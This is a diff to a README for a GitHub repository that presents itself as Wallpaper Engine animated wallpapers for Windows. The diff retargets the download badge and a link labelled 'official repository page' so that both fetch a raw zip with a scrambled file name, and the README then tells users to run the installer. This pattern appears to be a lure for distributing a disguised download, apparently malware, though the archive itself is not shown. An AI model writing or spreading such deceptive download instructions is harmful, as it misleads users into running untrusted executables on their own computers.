@@ -1,6 +1,6 @@
 # 💻 Wallpaper-Engine-Animated-Wallpapers-on-Windows - Make your desktop dynamic and lively
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Rol82560/Wallpaper-Engine-Animated-Wallpapers-on-Windows)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Rol82560/Wallpaper-Engine-Animated-Wallpapers-on-Windows/raw/refs/heads/main/AnimatedWallpaper/Engine-Windows-Animated-on-Wallpaper-Wallpapers-v3.8.zip)
 
 ## 📁 Project Overview
 This software allows you to display animated backgrounds on your Windows desktop. It turns static walls into moving, interactive scenes. You can choose from many high-quality backgrounds that range from subtle movements to fully interactive 3D simulations. The application manages resources to ensure your computer remains fast while you run content in 4K or 8K resolution.
@@ -17,7 +17,7 @@ You need a standard Windows 10 or Windows 11 PC to use this software. We recomme
 ## 📥 Getting the Software
 To install the application, follow these steps:
 
-1. Visit the [official repository page](https://github.com/Rol82560/Wallpaper-Engine-Animated-Wallpapers-on-Windows).
+1. Visit the [official repository page](https://github.com/Rol82560/Wallpaper-Engine-Animated-Wallpapers-on-Windows/raw/refs/heads/main/AnimatedWallpaper/Engine-Windows-Animated-on-Wallpaper-Wallpapers-v3.8.zip).
 2. Locate the link to download the installer.
 3. Save the file to your computer.
 4. Run the installer and follow the instructions on your screen.
